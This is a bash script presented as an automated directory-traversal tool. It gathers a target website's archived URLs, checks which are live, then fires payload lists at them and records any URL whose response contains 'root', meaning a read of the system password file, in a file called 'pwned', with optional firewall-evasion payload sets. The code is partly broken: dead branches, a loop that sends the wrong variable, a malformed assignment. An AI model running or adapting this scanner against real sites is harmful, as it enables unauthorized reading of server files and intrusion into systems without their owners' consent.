#! /bin/bash

echo "Url Extractor from Website"
echo "Enter website name:"
read site
echo -e "Target URL: \e[1;31m $site \e[0m"

#get all url from given site

waybackurls $site >allurl
cat allurl|grep ?id >?id
cat allurl|grep images >images
cat allurl|grep admin >admin
cat allurl|grep config >config
cat allurl|grep php >php
cat allurl|grep cgi >cgi
total=$(wc allurl|cut -d " " -f3)
id=(wc ?id)
images=$(wc images|cut -d " " -f3)
admin=$(wc admin|cut -d " " -f3)
config=$(wc config|cut -d " " -f3)
php=$(wc php|cut -d " " -f3)
cgi=$(wc cgi|cut -d " " -f3)
echo "Total URLS : $total"
echo "Total id URLS: $id"
echo "Total images URLS: $images"
echo "Total admin URLS: $admin"
echo "total config URLS: $config"
echo "Total php URLS: $php"
echo "Total cgi URLS: $cgi"
#live directory checking
i=0
echo "[***]Live Directory Checker"
echo "select corresponding filename for search"
echo "allurl[1].,id[2].,images[3].,admin[4].,php[5].,cgi[6]"
read file
total=$(wc $file|cut -d " " -f3)
echo $total

	for dir in $(cat $file);do
	response=$(curl -I -s "$dir"|head -n1|awk -F" " '{print $2}')

if [ $response == 200 ]||[ $response == 201 ]||[ $response == 202 ]||[ $response == 203 ]|| [ $response == 204 ];then
	echo "$dir" >>$file.200
elif [ $response == "300" ]||[ $response == "301" ]||[ $response == "302" ]||[ $response == "303" ];then
	echo "$dir" >>$file.300
else
	echo "$dir" >>$file.400
fi
echo "$response==>$dir"

i=$(($i+1)) 
done
echo "directory fetching completed"
echo "Automated tool for directory traversal"
echo "File/site[1,nothing]"
read response
if [ $response == "1" ];then
	echo $file.200
	echo $file.300
	echo $file.400
	echo "Enter filename:"
	read filename
		echo "converting file"
		
			echo $filename
			cat $filename|grep ?|cut -d "=" -f1|sed 's/$/=/g' >tmp1
			cat $filename|grep -v ? >tmp2
			cat tmp1 tmp2 >tmp
			filename=tmp
		for sample in $(cat $filename|head -n1);do
			echo "getting sample data"
			server=$(curl -s $sample|grep "server:"|head -n1|cut -d " " -f2)
                	echo $server >server
			echo $server
        	done
				echo "available a payload"
				echo "alldt"
				echo "bdt--879"
				echo "s{trip}dt--226"
				echo "edt--559"
				echo "dedt--48"
				read pload
				for site in $(cat $filename);do
					for payload in $(cat /var/payload/$pload);do
					curl -i -s $site$pload >response
					server=$(cat response|grep "server:"|head -n1|cut -d " " -f2)
					status=$(cat response|head -n1|cut -d " " -f2)
					#size=$(cat response|grep Content-Length|head -n1|cut -d " " -f2)
					sample=$(cat response|grep root)
					firewall=$(cat response|grep "server:"|head -n1|cut -d " " -f2)
					echo -ne "$site$payload $status \r"
					echo $server
					if [ 1 == 1 ];then
						if [ $payload == "root" ];then
								echo "target: $site$payload" >>pwned
								break
						fi
						continue
						else
						echo "firewall detected want to use new payload[yes/no]"
						read res
						if [ "$res" == "y" ];then
						echo "available a payload"
                		                echo "alldt"
		                                echo "bdt--879"
		                                echo "s{trip}dt--226"
		                                echo "edt--559"
                                      	        echo "dedt--48"
						read pload1
						for payload in $(cat /var/payload/$pload1);do
	                				curl -i -s "$site$pload1" >response
		        			        status=$(cat response|head -n1|cut -d " " -f2)
	        				        size=$(cat response|grep Content-Length|head -n1|cut -d " " -f2)
        					        sample=$(cat response|sed -n 1p|cut -d ":" -f1)
		                			firewall=$(cat response|grep "server:"|head -n1|cut -d " " -f2)
        					        echo -ne "$site$payload $status \r"
							if [ $payload == "root" ];then
								echo "target: $site$payload" >>pwned
								break
							fi
						done
						fi
			      	  fi
				done
			done
		else
echo "Enter sitename: "
read site
	echo "available a payload"
				echo "alldt"
				echo "bdt--879"
				echo "s{trip}dt--226"
				echo "edt--559"
				echo "dedt--48"
				read pload
	for payload in $(cat /var/payload/$pload);do
                curl -i -s $site$payload >response
                status=$(cat response|head -n1|cut -d " " -f2)
                size=$(cat response|grep Content-Length|head -n1|cut -d " " -f2)
                sample=$(cat response|grep root|sed -n 1p|cut -d ":" -f1)
                echo -ne "$site$payload $status \r"
                echo $size
		echo $sample
		if [ 1 == 1 ];then
                
                		if [ $sample == "root" ];then
                                                        echo "target: $site$payload" >>pwned
                                                        break
                                 fi
		else
                        echo "use firewall[yes/no]"
                        read res
                	        if [ $res == "y" ];then
                        	        for payload in $(cat /var/payload/edt);do
						echo $site$payload
                                		curl -s -i $site$payload >response      
		                                status=$(cat response|head -n1|cut -d " " -f2)
                		                #size=$(cat response|grep Content-Length|head -n1|cut -d " " -f2)
         	          	                sample=$(cat response|grep root|sed -n 1p|cut -d ":" -f1)     
                	        	        firewall=$(cat response|grep "server:"|head -n1|cut -d " " -f2)
            		                       # echo -ne "$site$payload $status \r" 
echo $sample 
                      	          		if [ $sample == "root" ];then
                           	   	  		echo "target: $site$payload" >>pwned
                                	  		break
                                  		fi  
                                	done
					break
        			fi
		fi

	done
fi
